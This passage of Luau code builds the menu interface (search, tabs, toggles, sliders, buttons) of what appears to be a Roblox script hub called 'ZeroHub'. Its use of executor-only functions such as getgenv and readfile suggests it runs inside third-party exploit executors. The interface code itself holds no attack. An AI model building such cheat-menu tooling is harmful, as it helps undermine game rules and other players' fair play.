			if string.find(v24, v22, 1, true) or string.find(v26, v22, 1, true) or string.find(v25, v22, 1, true) or string.find(v27, v22, 1, true) or string.find(v28, v22, 1, true) then
				n3 += 1
				fn39(v23, n3)
				if not (n3 >= 50) then
					continue
				end
			else
				continue
			end

			break
		end

		TextLabel2.Text = n3 .. (n3 == 1 and " match" or " matches")
		Frame6.Visible = n3 > 0
		local n4 = math.min(n3 * 36 + 8, 240)
		Frame6.Size = UDim2.new(0, 260, 0, n4)
	end

	TextBox:GetPropertyChangedSignal("Text"):Connect(function()
		fn40(TextBox.Text)
	end)

	TextBox.Focused:Connect(function()
		fn15(UIStroke, { Color = theme.AccentText }, 0.15)

		if TextBox.Text ~= "" then
			fn40(TextBox.Text)
		end
	end)

	TextBox.FocusLost:Connect(function()
		if TextBox.Text == "" then
			fn15(UIStroke, { Color = theme.Stroke }, 0.15)
		end
	end)

	fn12(function()
		if TextBox.Text ~= "" then
			UIStroke.Color = theme.AccentText
		else
			UIStroke.Color = theme.Stroke
		end
	end)

	local Frame7 = fn17("Frame", {
		Name = "TabsHolder",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Size = UDim2.new(0, 180, 1, -47),
		Position = UDim2.new(0, 0, 0, 46),
	})

	fn17("Frame", {
		Name = "Line",
		Parent = Frame7,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Stroke,
		Size = UDim2.new(0, 1, 1, 0),
		Position = UDim2.new(1, 0, 0, 0),
	})

	local ScrollingFrame2 = fn17("ScrollingFrame", {
		Name = "ActualTabsHolder",
		Parent = Frame7,
		Active = true,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 1, 0),
		CanvasSize = UDim2.new(0, 0, 0, 0),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		ScrollBarThickness = 0,
	})

	fn17("UIListLayout", { Padding = UDim.new(0, 5), SortOrder = Enum.SortOrder.LayoutOrder, Parent = ScrollingFrame2 })
	fn17("UIPadding", { PaddingTop = UDim.new(0, 10), Parent = ScrollingFrame2 })

	local Frame8 = fn17("Frame", {
		Name = "GroupboxesHolder",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		AnchorPoint = Vector2.new(1, 1),
		Size = UDim2.new(1, -180, 1, -46),
		Position = UDim2.new(1, 0, 1, 0),
	})

	local TextButton = fn17("TextButton", {
		Name = "Backdrop",
		Parent = Frame2,
		Text = "",
		AutoButtonColor = false,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 1, 0),
		Visible = false,
		ZIndex = 100,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = TextButton })
	local window = setmetatable({}, index)
	window.Screen = ScreenGui
	window.Main = Frame2
	window.TopBar = Frame3
	window.TabsScroller = ScrollingFrame2
	window.GroupboxesHolder = Frame8
	window.Backdrop = TextButton
	window.ExecBadge = v19
	window.Categories = {}
	window.Tabs = {}
	tbl14 = { Frame3, Frame7, Frame8 }
	window.ActiveTab = nil
	window.Minimized = false
	window.OpenPopupCount = 0
	fn28(Frame3, Frame2)

	if not flag4 then
		local TextButton2 = fn17("TextButton", {
			Name = "ResizeHandle",
			Parent = Frame2,
			Text = "",
			AutoButtonColor = false,
			BackgroundTransparency = 1,
			Size = UDim2.fromOffset(16, 16),
			AnchorPoint = Vector2.new(1, 1),
			Position = UDim2.fromScale(1, 1),
			ZIndex = 100,
		})

		local TextLabel3 = fn17("TextLabel", {
			Parent = TextButton2,
			Text = "โ—ข",
			TextSize = 12,
			FontFace = InterRegular,
			TextColor3 = theme.SubText,
			BackgroundTransparency = 1,
			Size = UDim2.fromScale(1, 1),
			TextXAlignment = Enum.TextXAlignment.Right,
			TextYAlignment = Enum.TextYAlignment.Bottom,
		})

		local flag8 = false
		local position = nil
		local absoluteSize = nil

		local function fn41(arg3)
			return arg3 == Enum.UserInputType.MouseButton1 or arg3 == Enum.UserInputType.Touch
		end

		local function fn42(arg3)
			return arg3 == Enum.UserInputType.MouseMovement or arg3 == Enum.UserInputType.Touch
		end

		TextButton2.InputBegan:Connect(function(input)
			if fn41(input.UserInputType) then
				flag8 = true
				position = input.Position
				absoluteSize = Frame2.AbsoluteSize
				tbl:CloseAllPopups()
			end
		end)

		fn14(UserInputService.InputEnded, function(arg3)
			if fn41(arg3.UserInputType) and flag8 then
				flag8 = false
			end
		end)

		fn14(UserInputService.InputChanged, function(arg3)
			if flag8 and fn42(arg3.UserInputType) then
				local n3 = arg3.Position - position
				local n4 = math.max(700, absoluteSize.X + n3.X)
				local n5 = math.max(400, absoluteSize.Y + n3.Y)
				Frame2.Size = UDim2.fromOffset(n4, n5)
			end
		end)

		TextButton2.MouseEnter:Connect(function()
			fn15(TextLabel3, { TextColor3 = theme.AccentText }, 0.2)
		end)

		TextButton2.MouseLeave:Connect(function()
			fn15(TextLabel3, { TextColor3 = theme.SubText }, 0.2)
		end)
	end

	local function fn41(arg3)
		arg3.MouseEnter:Connect(function()
			fn15(arg3, { ImageColor3 = Color3.fromRGB(255, 255, 255) }, 0.2)
		end)

		arg3.MouseLeave:Connect(function()
			fn15(arg3, { ImageColor3 = theme.DimText }, 0.2)
		end)
	end

	fn41(v20)
	fn41(v21)

	v20.MouseButton1Click:Connect(function()
		window:Unload()
	end)

	v21.MouseButton1Click:Connect(function()
		Frame2.Visible = false

		if settings.CursorEnabled then
			UserInputService.MouseIconEnabled = true
		end

		tbl:Notify({
			Title = "Menu Hidden",
			Description = "Press " .. (window.ToggleKey and window.ToggleKey.Name or "Right Shift") .. " to reopen the menu.",
			Type = "Info",
			Duration = 5,
		})
	end)

	TextButton.MouseButton1Click:Connect(function()
		tbl:CloseAllPopups()
	end)

	if settings.CursorEnabled then
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Name = "Cursor"
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = settings.CursorImage
		imageLabel.ImageColor3 = settings.CursorColor
		imageLabel.Size = UDim2.fromOffset(settings.CursorSize.X, settings.CursorSize.Y)
		imageLabel.AnchorPoint = Vector2.new(0, 0)
		imageLabel.ZIndex = 9999
		imageLabel.Parent = ScreenGui
		window.Cursor = imageLabel

		fn14(RunService.RenderStepped, function()
			local cursorEnabled = Frame2.Visible and settings.CursorEnabled
			imageLabel.Visible = cursorEnabled

			if cursorEnabled then
				local mouseLocation = UserInputService:GetMouseLocation()
				imageLabel.Position = UDim2.fromOffset(mouseLocation.X + settings.CursorOffset.X, mouseLocation.Y + settings.CursorOffset.Y)

				if UserInputService.MouseIconEnabled then
					UserInputService.MouseIconEnabled = false
				end
			end
		end)

		UserInputService.MouseIconEnabled = false
	end

	window.ToggleKey = tbl16.ToggleKey or Enum.KeyCode.RightShift

	pcall(function()
		if isfile("ZeroHub/Zero_MenuKey.txt") then
			local v22 = Enum.KeyCode[readfile("ZeroHub/Zero_MenuKey.txt")]

			if v22 then
				window.ToggleKey = v22
			end
		end
	end)

	if tbl16.ToggleKey ~= false then
		fn14(UserInputService.InputBegan, function(arg3, arg4)
			if not arg4 and arg3.KeyCode == window.ToggleKey then
				Frame2.Visible = not Frame2.Visible

				if settings.CursorEnabled then
					UserInputService.MouseIconEnabled = not Frame2.Visible
				end
			end
		end)
	end

	if flag4 then
		local TextButton2 = fn17("TextButton", {
			Name = "MobileToggle",
			Parent = ScreenGui,
			Text = "",
			AutoButtonColor = false,
			BackgroundColor3 = theme.Accent,
			AnchorPoint = Vector2.new(1, 1),
			Position = UDim2.new(1, -16, 1, -16),
			Size = UDim2.fromOffset(48, 48),
			ZIndex = 9998,
		})

		fn17("UICorner", { CornerRadius = UDim.new(1, 0), Parent = TextButton2 })

		fn17("UIStroke", {
			Color = theme.Stroke,
			Thickness = 1.5,
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
			Parent = TextButton2,
		})

		for _, v22 in ipairs({ -7, 0, 7 }) do
			fn17("Frame", {
				Parent = TextButton2,
				BorderSizePixel = 0,
				BackgroundColor3 = theme.AccentText,
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.new(0.5, 0, 0.5, v22),
				Size = UDim2.fromOffset(22, 3),
			})
		end

		TextButton2.MouseButton1Click:Connect(function()
			Frame2.Visible = not Frame2.Visible
		end)
	end

	pcall(function()
		window:SetExecutions(tbl8.Increment())
	end)

	tbl.Window = window
	getgenv()._ZeroWindow = window
	return window
end

index.ToggleVisible = function(arg)
	if arg.Main then
		local visible = not arg.Main.Visible
		arg.Main.Visible = visible

		if settings.CursorEnabled then
			UserInputService.MouseIconEnabled = not visible
		end
	end
end

index.ShowBackdrop = function(arg)
	arg.OpenPopupCount = arg.OpenPopupCount + 1
	arg.Backdrop.Visible = true
	fn15(arg.Backdrop, { BackgroundTransparency = 0.5 }, 0.2)
end

index.HideBackdrop = function(arg)
	arg.OpenPopupCount = math.max(0, arg.OpenPopupCount - 1)

	if arg.OpenPopupCount == 0 then
		fn15(arg.Backdrop, { BackgroundTransparency = 1 }, 0.2)

		task.delay(0.16, function()
			if arg.OpenPopupCount == 0 then
				arg.Backdrop.Visible = false
			end
		end)
	end
end

index.SetMinimized = function(arg, minimized)
	arg.Minimized = minimized

	if minimized then
		arg.FullSize = arg.Main.Size
		arg.Main.ClipsDescendants = true
		fn15(arg.Main, { Size = UDim2.new(arg.Main.Size.X.Scale, arg.Main.Size.X.Offset, 0, 45) }, 0.25)
	else
		fn15(arg.Main, { Size = arg.FullSize or UDim2.fromOffset(960, 580) }, 0.25)

		task.delay(0.26, function()
			arg.Main.ClipsDescendants = false
		end)
	end
end

index.SetExecutions = function(arg, arg2)
	arg.ExecBadge.Text = tostring(arg2) .. " EXECUTIONS"
end

index.Unload = function(arg)
	for _, connection in ipairs(tbl.Connections) do
		pcall(function()
			connection:Disconnect()
		end)
	end

	tbl.Connections = {}

	pcall(function()
		UserInputService.MouseIconEnabled = true
	end)

	if Frame then
		pcall(function()
			Frame.Parent:Destroy()
		end)

		Frame = nil
	end

	tbl10 = {}

	if v17 then
		pcall(function()
			v17:Destroy()
		end)

		v17 = nil
	end

	if getgenv()._ZeroWindow == arg then
		getgenv()._ZeroWindow = nil
	end

	if arg.Screen then
		arg.Screen:Destroy()
	end
end

index.AddCategory = function(window, name)
	local Frame2 = fn17("Frame", {
		Name = "TabCategory",
		Parent = window.TabsScroller,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, 0, 0, 0),
	})

	fn17("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame2 })

	local TextLabel = fn17("TextLabel", {
		Name = "TabTitle",
		Parent = Frame2,
		LayoutOrder = 1,
		BorderSizePixel = 0,
		TextSize = 16,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.CategoryTitle,
		Size = UDim2.new(1, 0, 0, 30),
		Text = name,
	})

	fn17("UIPadding", { PaddingLeft = UDim.new(0, 10), Parent = TextLabel })

	local ImageButton = fn17("ImageButton", {
		Name = "TabArrow",
		Parent = TextLabel,
		BorderSizePixel = 0,
		AutoButtonColor = false,
		BackgroundTransparency = 1,
		ImageColor3 = theme.CategoryTitle,
		AnchorPoint = Vector2.new(1, 0.5),
		Image = tbl12.Arrow,
		Size = UDim2.new(0, 15, 0, 15),
		Position = UDim2.new(1, -10, 0.5, 2),
	})

	local Frame3 = fn17("Frame", {
		Name = "TabsContainer",
		Parent = Frame2,
		LayoutOrder = 2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, 0, 0, 0),
	})

	fn17("UIListLayout", { Padding = UDim.new(0, 5), SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame3 })
	local obj = setmetatable({}, index2)
	obj.Window = window
	obj.Holder = Frame2
	obj.Container = Frame3
	obj.Arrow = ImageButton
	obj.Collapsed = false
	obj.Name = name

	ImageButton.MouseButton1Click:Connect(function()
		obj.Collapsed = not obj.Collapsed
		fn29(Frame3, ImageButton, obj.Collapsed, 180)
	end)

	ImageButton.MouseEnter:Connect(function()
		fn15(ImageButton, { Rotation = (obj.Collapsed and 180 or 0) + 20 }, 0.2)
	end)

	ImageButton.MouseLeave:Connect(function()
		fn15(ImageButton, { Rotation = obj.Collapsed and 180 or 0 }, 0.2)
	end)

	table.insert(window.Categories, obj)
	table.insert(tbl11, obj)
	return obj
end

index2.AddTab = function(arg, arg2)
	local window = arg.Window

	local TextLabel = fn17("TextLabel", {
		Name = "Tab",
		Parent = arg.Container,
		BorderSizePixel = 0,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.TabUnselected,
		Size = UDim2.new(1, 0, 0, 24),
		Text = arg2,
	})

	local UIPadding = fn17("UIPadding", { PaddingLeft = UDim.new(0, 10), Parent = TextLabel })

	local Frame2 = fn17("Frame", {
		Name = "SelectedTabLine",
		Parent = TextLabel,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.AccentText,
		AnchorPoint = Vector2.new(0, 1),
		Size = UDim2.new(0, 0, 0, 5),
		Position = UDim2.new(0, 0, 1, 5),
	})

	fn17("UICorner", { CornerRadius = UDim.new(1, 0), Parent = Frame2 })

	fn12(function()
		Frame2.BackgroundColor3 = theme.AccentText
	end)

	local TextButton = fn17("TextButton", {
		Parent = TextLabel,
		Text = "",
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 3,
	})

	local ScrollingFrame = fn17("ScrollingFrame", {
		Name = "Page",
		Parent = window.GroupboxesHolder,
		Active = true,
		Visible = false,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 1, 0),
		CanvasSize = UDim2.new(0, 0, 0, 0),
		AutomaticCanvasSize = Enum.AutomaticSize.Y,
		ScrollBarThickness = 0,
	})

	fn17("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder, Parent = ScrollingFrame })

	fn17("UIPadding", {
		PaddingTop = UDim.new(0, 8),
		PaddingRight = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 8),
		Parent = ScrollingFrame,
	})

	local activeTab

	activeTab = {
		Window = window,
		Label = TextLabel,
		Padding = UIPadding,
		Line = Frame2,
		Page = ScrollingFrame,
		Selected = false,
		CategoryName = arg.Name,
		AddGroupbox = function(arg3, arg4)
			return fn34(activeTab, arg4)
		end,
		Select = function()
			if window.ActiveTab == activeTab then
				return
			end
			local activeTab2 = window.ActiveTab
			window.ActiveTab = activeTab

			if activeTab2 then
				activeTab2.Selected = false
				activeTab2.Page.Visible = false
				fn15(activeTab2.Label, { TextColor3 = theme.TabUnselected, Size = UDim2.new(1, 0, 0, 20) }, 0.13)
				fn15(activeTab2.Padding, { PaddingBottom = UDim.new(0, 0) }, 0.13)
				fn15(activeTab2.Line, { Size = UDim2.new(0, 0, 0, 5) }, 0.13)
			end

			activeTab.Selected = true
			ScrollingFrame.Visible = true
			fn26(ScrollingFrame)
			fn15(TextLabel, { TextColor3 = theme.TabSelected, Size = UDim2.new(1, 0, 0, 28) }, 0.13)
			fn15(UIPadding, { PaddingBottom = UDim.new(0, 3) }, 0.13)
			fn15(Frame2, { Size = UDim2.new(0, 13, 0, 5) }, 0.2)
		end,
	}

	TextButton.MouseEnter:Connect(function()
		if not activeTab.Selected then
			fn15(TextLabel, { TextColor3 = theme.Title }, 0.12)
			fn15(Frame2, { BackgroundTransparency = 0.5 }, 0.12)
		end
	end)

	TextButton.MouseLeave:Connect(function()
		if not activeTab.Selected then
			fn15(TextLabel, { TextColor3 = theme.TabUnselected }, 0.2)
			fn15(Frame2, { BackgroundTransparency = 1 }, 0.2)
		end
	end)

	TextButton.MouseButton1Click:Connect(function()
		activeTab:Select()
	end)

	table.insert(window.Tabs, activeTab)

	if not window.ActiveTab then
		activeTab:Select()
	end

	return activeTab
end

index2.SetCollapsed = function(arg, collapsed)
	arg.Collapsed = collapsed
	fn29(arg.Container, arg.Arrow, collapsed, 180)
end

index3.AddToggle = function(arg, arg2, arg3)
	local tbl16 = arg3 or {}
	local v18 = fn31(arg.Container)
	local v19 = fn32(v18, tbl16.Text or "Toggle", theme.Text)

	if tbl16.Description then
		fn33(v18, tbl16.Description)
	end

	fn22(v18, tbl16)

	local Frame2 = fn17("Frame", {
		Name = "Checkmark",
		Parent = v18,
		ZIndex = 2,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.ElementBackground,
		AnchorPoint = Vector2.new(1, 0.5),
		Size = UDim2.new(0, 18, 0, 18),
		Position = UDim2.new(1, -8, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame2 })

	local UIStroke = fn17("UIStroke", {
		Thickness = 1.3,
		Color = theme.ElementStroke,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = Frame2,
	})

	local v20 = fn20(Frame2, { Color = Color3.fromRGB(200, 200, 220), Size = 4, Transparency = 1, Offset = Vector2.new(0, 0) })

	local Frame3 = fn17("Frame", {
		Name = "Glow",
		Parent = Frame2,
		ZIndex = 0,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Accent,
		BackgroundTransparency = 1,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Size = UDim2.new(0, 20, 0, 20),
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 2), Parent = Frame3 })

	local UIStroke2 = fn17("UIStroke", {
		Thickness = 2,
		Color = theme.Accent,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Transparency = 1,
		Parent = Frame3,
	})

	local ImageLabel2 = fn17("ImageLabel", {
		Parent = Frame2,
		ZIndex = 2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		ImageColor3 = Color3.fromRGB(255, 255, 255),
		ImageTransparency = 1,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Image = tbl12.Check,
		Size = UDim2.new(0, 13, 0, 13),
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})

	local TextButton = fn17("TextButton", {
		Name = "ButtonToEnableCheckbox",
		Parent = Frame2,
		Text = "",
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 4,
	})

	local tbl17 = {
		Type = "Toggle",
		Flag = arg2,
		Value = tbl16.Default or false,
		Callback = tbl16.Callback,
		Holder = v18,
		Window = arg.Window,
	}

	local function fn35()
		local color = theme.Accent.R * 0.299 + theme.Accent.G * 0.587 + theme.Accent.B * 0.114 > 0.25 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)

		if tbl17.Value then
			fn15(Frame2, { BackgroundColor3 = theme.Accent }, 0.2)
			fn15(UIStroke, { Transparency = 0, Color = theme.Accent:Lerp(Color3.new(0, 0, 0), 0.4), Thickness = 1.3 }, 0.2)
			fn15(ImageLabel2, { ImageTransparency = 0, ImageColor3 = color }, 0.2)
			fn15(UIStroke2, { Transparency = 0, Color = theme.AccentText }, 0.2)
			fn15(v19, { TextColor3 = theme.Title }, 0.2)

			if v20 then
				pcall(function()
					fn15(v20, { Transparency = 0.3, Size = 12 }, 0.2)
				end)
			end
		else
			fn15(Frame2, { BackgroundColor3 = theme.ElementBackground }, 0.2)
			fn15(UIStroke, { Transparency = 0, Color = theme.ElementStroke, Thickness = 1.3 }, 0.2)
			fn15(ImageLabel2, { ImageTransparency = 1 }, 0.2)
			fn15(UIStroke2, { Transparency = 1 }, 0.2)
			fn15(v19, { TextColor3 = theme.Text }, 0.2)

			if v20 then
				pcall(function()
					fn15(v20, { Transparency = 1, Size = 4 }, 0.2)
				end)
			end
		end
	end

	tbl17.SetValue = function(arg4, arg5, arg6)
		tbl17.Value = arg5 and true or false
		tbl.Flags[arg2] = tbl17.Value
		fn35()

		if not arg6 then
			fn19(tbl17.Callback, tbl17.Value)
		end
	end

	tbl17.OnChanged = function(arg4, callback)
		tbl17.Callback = callback
	end

	TextButton.MouseEnter:Connect(function()
		if not tbl17.Value then
			fn15(UIStroke, { Transparency = 0, Thickness = 2, Color = theme.AccentText:Lerp(theme.ElementStroke, 0.5) }, 0.12)
			fn15(Frame2, { BackgroundColor3 = theme.ElementBackground:Lerp(Color3.new(1, 1, 1), 0.08) }, 0.12)
			fn15(v19, { TextColor3 = theme.Title }, 0.12)
		end
	end)

	TextButton.MouseLeave:Connect(function()
		if not tbl17.Value then
			fn15(UIStroke, { Transparency = 0, Thickness = 1.3, Color = theme.ElementStroke }, 0.2)
			fn15(Frame2, { BackgroundColor3 = theme.ElementBackground }, 0.2)
			fn15(v19, { TextColor3 = theme.Text }, 0.2)
		end
	end)

	TextButton.MouseButton1Click:Connect(function()
		tbl17:SetValue(not tbl17.Value)
	end)

	if arg2 then
		tbl.Flags[arg2] = tbl17.Value
		tbl.Options[arg2] = tbl17
		fn13(tbl16.Text or "Toggle", "Toggle", arg2, arg)
	end

	fn35()
	fn12(fn35)

	tbl17.AddKeybind = function(arg4, arg5)
		return tbl:BindKeybind(tbl17, arg5 or {})
	end

	return tbl17
end

index3.AddSlider = function(arg, arg2, arg3)
	local tbl16 = arg3 or {}
	local min = tbl16.Min or 0
	local max = tbl16.Max or 100
	local flag7 = tbl16.Decimals ~= nil
	local decimals = tbl16.Decimals or 0
	local suffix = tbl16.Suffix or ""
	local flag8 = tbl16.Description ~= nil
	local v18 = fn31(arg.Container, flag8 and nil or 36)
	v18.AutomaticSize = flag8 and Enum.AutomaticSize.Y or Enum.AutomaticSize.None
	fn22(v18, tbl16)

	local TextLabel = fn17("TextLabel", {
		Name = "SliderTitle",
		Parent = v18,
		BorderSizePixel = 0,
		TextSize = 14,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.Text,
		AutomaticSize = Enum.AutomaticSize.XY,
		Text = tbl16.Text or "Slider",
	})

	fn17("UIPadding", {
		PaddingTop = UDim.new(0, 7),
		PaddingLeft = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 3),
		Parent = TextLabel,
	})

	local Frame2 = fn17("Frame", {
		Name = "Track",
		Parent = v18,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.SliderTrack,
		AnchorPoint = flag8 and Vector2.new(0.5, 0) or Vector2.new(0.5, 1),
		Size = UDim2.new(1, -20, 0, 6),
		Position = flag8 and UDim2.new(0.5, 0, 0, 35) or UDim2.new(0.5, 0, 1, -5),
	})

	fn17("UICorner", { CornerRadius = UDim.new(1, 0), Parent = Frame2 })

	fn17("UIStroke", {
		Thickness = 1,
		Color = Color3.fromRGB(40, 40, 50),
		Transparency = 0.5,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = Frame2,
	})

	local Frame3 = fn17("Frame", {
		Name = "Fill",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.SliderFill,
		Size = UDim2.new(0, 0, 1, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(1, 0), Parent = Frame3 })
	table.insert(tbl.SliderFills, Frame3)

	local Frame4 = fn17("Frame", {
		Name = "Knob",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromRGB(200, 200, 210),
		AnchorPoint = Vector2.new(0.5, 0.5),
		Size = UDim2.new(0, 12, 0, 12),
		Position = UDim2.new(0, 0, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(1, 0), Parent = Frame4 })

	fn17("UIStroke", {
		Thickness = 1.5,
		Color = Color3.fromRGB(80, 80, 95),
		Transparency = 0.3,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = Frame4,
	})

	fn20(Frame4, { Color = Color3.fromRGB(220, 220, 240), Size = 8, Transparency = 0.5, Offset = Vector2.new(0, 0) })

	local TextBox = fn17("TextBox", {
		Name = "ValueLabel",
		Parent = v18,
		BorderSizePixel = 0,
		TextSize = 14,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.Text,
		AnchorPoint = Vector2.new(1, 1),
		AutomaticSize = Enum.AutomaticSize.XY,
		Text = "0",
		ClearTextOnFocus = true,
		Position = UDim2.new(1, -8, 1, -15),
	})

	if flag8 then
		fn33(v18, tbl16.Description).Position = UDim2.new(0, 0, 0, 45)
		TextBox.AnchorPoint = Vector2.new(1, 0)
		TextBox.Position = UDim2.new(1, -8, 0, 8)
	end

	local tbl17 = { Type = "Slider", Flag = arg2, Value = tbl16.Default or min, Callback = tbl16.Callback }

	local function fn35(arg4)
		local flag9 = not flag7 and decimals <= 0
		local n3 = decimals

		if flag9 then
			local n4 = max - min

			if n4 < 1 then
				n3 = 2
			else
				n3 = decimals

				if n4 < 10 then
					n3 = 1
				end
			end
		end

		if n3 <= 0 then
			return math.floor(arg4 + 0.5)
		end
		local n4 = 10 ^ n3
		return math.floor(arg4 * n4 + 0.5) / n4
	end

	local function fn36()
		local n3 = math.clamp((tbl17.Value - min) / (max - min), 0, 1)
		fn15(Frame3, { Size = UDim2.new(n3, 0, 1, 0) }, 0.1)
		fn15(Frame4, { Position = UDim2.new(n3, 0, 0.5, 0) }, 0.1)
		TextBox.Text = tostring(tbl17.Value) .. suffix
	end

	TextBox.FocusLost:Connect(function()
		local str4 = TextBox.Text:gsub(suffix, "")
		local num = tonumber(str4)

		if num then
			local value = math.clamp(num, min, max)
			tbl17.Value = value
			tbl.Flags[arg2] = value
			fn36()
			fn19(tbl17.Callback, value)
		else
			fn36()
		end
	end)

	tbl17.SetValue = function(arg4, arg5, arg6)
		tbl17.Value = fn35(math.clamp(arg5, min, max))
		tbl.Flags[arg2] = tbl17.Value
		fn36()

		if not arg6 then
			fn19(tbl17.Callback, tbl17.Value)
		end
	end

	local flag9 = false

	local function fn37(arg4)
		tbl17:SetValue(min + (max - min) * math.clamp((arg4.X - Frame2.AbsolutePosition.X) / Frame2.AbsoluteSize.X, 0, 1))
	end

	local function fn38(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag9 = true
			fn15(TextLabel, { TextColor3 = theme.Title }, 0.2)
			fn15(TextBox, { TextColor3 = theme.Title }, 0.2)
			fn15(Frame4, { Size = UDim2.new(0, 10, 0, 10) }, 0.1)
			fn37(input.Position)
		end
	end

	Frame2.InputBegan:Connect(fn38)
	Frame4.InputBegan:Connect(fn38)

	fn14(UserInputService.InputChanged, function(arg4)
		if flag9 and (arg4.UserInputType == Enum.UserInputType.MouseMovement or arg4.UserInputType == Enum.UserInputType.Touch) then
			fn37(arg4.Position)
		end
	end)

	fn14(UserInputService.InputEnded, function(arg4)
		if (arg4.UserInputType == Enum.UserInputType.MouseButton1 or arg4.UserInputType == Enum.UserInputType.Touch) and flag9 then
			flag9 = false
			fn15(TextLabel, { TextColor3 = theme.Text }, 0.2)
			fn15(TextBox, { TextColor3 = theme.Text }, 0.2)
			fn15(Frame4, { Size = UDim2.new(0, 12, 0, 12) }, 0.1)
		end
	end)

	if arg2 then
		tbl.Flags[arg2] = tbl17.Value
		tbl.Options[arg2] = tbl17
		fn13(tbl16.Text or "Slider", "Slider", arg2, arg)
	end

	fn36()
	return tbl17
end

index3.AddButton = function(arg, arg2)
	local tbl16 = arg2 or {}
	local v18 = fn31(arg.Container, 35)
	v18.AutomaticSize = Enum.AutomaticSize.None
	fn22(v18, tbl16)
	local color = tbl16.Color or theme.ButtonDefault

	local Frame2 = fn17("Frame", {
		Name = "Button",
		Parent = v18,
		BorderSizePixel = 0,
		BackgroundColor3 = color,
		BackgroundTransparency = 0.4,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Size = UDim2.new(1, -15, 1, -10),
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 4), Parent = Frame2 })
	local v19 = fn17
	local tbl17 = {}
	local colorSequence = ColorSequence.new
	local tbl18 = {}
	local v20 = ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 60))
	local v21 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 30, 38))
	tbl18[1] = v20
	tbl18[2] = v21

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 24)))
		table.move(values, 1, values.n, 3, tbl18)
	end

	tbl17.Color = colorSequence(tbl18)
	local new = NumberSequenceKeypoint.new
	tbl17.Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0.3), new(1, 0.6) })
	tbl17.Rotation = 90
	tbl17.Parent = Frame2
	v19("UIGradient", tbl17)

	local UIStroke = fn17("UIStroke", {
		Color = tbl16.Color or theme.ButtonDefaultStroke,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = Frame2,
	})

	fn20(Frame2, { Color = Color3.fromRGB(160, 160, 190), Size = 6, Transparency = 0.8, Offset = Vector2.new(0, 0) })

	local TextButton = fn17("TextButton", {
		Parent = Frame2,
		BorderSizePixel = 0,
		TextSize = 14,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		BackgroundTransparency = 1,
		FontFace = font,
		Size = UDim2.new(1, 0, 1, 0),
		Text = tbl16.Text or "Button",
	})

	local tbl19 = { Type = "Button", Func = tbl16.Func or tbl16.Callback }
	local flag7 = false
	local flag8 = false
	UIStroke.Transparency = 0.4

	TextButton.MouseEnter:Connect(function()
		flag8 = true
		fn15(Frame2, { BackgroundTransparency = 0.15 }, 0.15)
